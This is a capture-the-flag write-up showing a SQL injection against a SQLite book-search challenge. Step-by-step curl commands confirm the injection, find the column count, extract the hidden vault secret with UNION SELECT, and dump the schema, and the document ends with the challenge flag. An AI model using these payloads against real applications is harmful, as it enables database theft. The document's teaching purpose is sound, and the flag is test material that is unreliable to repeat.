## 1. Reconnaissance

The challenge URL redirects from HTTPS to HTTP on port `8080`:

```bash
TARGET="https://challenges.tibeb.org/9ae3abe4-b68a-4dbf-a764-9706f3a8256d"
curl -sS -L -D headers.txt -o page.html "$TARGET"
```

The final URL becomes:

```
http://challenges.tibeb.org:8080/9ae3abe4-b68a-4dbf-a764-9706f3a8256d/
```

The page contains a simple search form with a single parameter `q`:

```html
<form><input name=q placeholder='Search titles'><button>Search</button></form>
```

It also hints at the database structure:

> One-column title search. Tables: books(title), vault(secret).

So we know there is a `books` table with a `title` column, and a `vault` table with a `secret` column.

---

## 2. Confirming SQL Injection

We set a base URL for convenience:

```bash
BASE="http://challenges.tibeb.org:8080/9ae3abe4-b68a-4dbf-a764-9706f3a8256d"
```

A normal search for `Weaving` returns the matching book title:

```bash
curl -sS -G "$BASE/" --data-urlencode "q=Weaving"
# -> History of Weaving
```

Injecting a single quote `'` triggers an SQL error:

```bash
curl -sS -G "$BASE/" --data-urlencode "q='"
```

Response:

```
SQLite says: unrecognized token: "'"
```

This confirms:
- The backend uses **SQLite**.
- The input is directly concatenated into an SQL query.
- Error messages are displayed, which is helpful for exploitation.

---

## 3. Determining Column Count

We test for a `UNION SELECT` with one column:

```bash
curl -sS -G "$BASE/" --data-urlencode "q=Weaving' UNION SELECT 1 -- "
```

Response includes:

```
1
History of Weaving
```

So the original query returns exactly **one column**, and our injected `1` is displayed. This means we can use a single-column `UNION SELECT` to extract arbitrary data.

---

## 4. Extracting the Secret

The hint told us the secret is in `vault.secret`. We directly query it:

```bash
curl -sS -G "$BASE/" --data-urlencode "q=Weaving' UNION SELECT secret FROM vault -- "
```

The response contains the flag:

```html
<pre>History of Weaving
tibeb{catalogue_37a73e20bc52fd0e3b46}</pre>
```

---

## 5. Verifying the Database Structure (Optional)

For completeness, we can list all tables:

```bash
curl -sS -G "$BASE/" --data-urlencode "q=Weaving' UNION SELECT name FROM sqlite_master WHERE type='table' -- "
```

Output:

```
books
vault
```

And dump the schema:

```bash
curl -sS -G "$BASE/" --data-urlencode "q=Weaving' UNION SELECT sql FROM sqlite_master WHERE type='table' -- "
```

Output:

```sql
CREATE TABLE books(title TEXT)
CREATE TABLE vault(secret TEXT)
```

This confirms the structure we already suspected.

---

## 6. Flag

```text
tibeb{catalogue_37a73e20bc52fd0e3b46}
```

---

## Summary

- **Vulnerability:** SQL Injection (SQLite) in the `q` parameter.
- **Exploitation:** Used `UNION SELECT` to read from the `vault` table.
- **Payload:** `Weaving' UNION SELECT secret FROM vault -- `
- **Flag:** `tibeb{catalogue_37a73e20bc52fd0e3b46}`

The challenge was straightforward once the injection point and column count were identified. The hint about the `vault` table made the final extraction trivial.
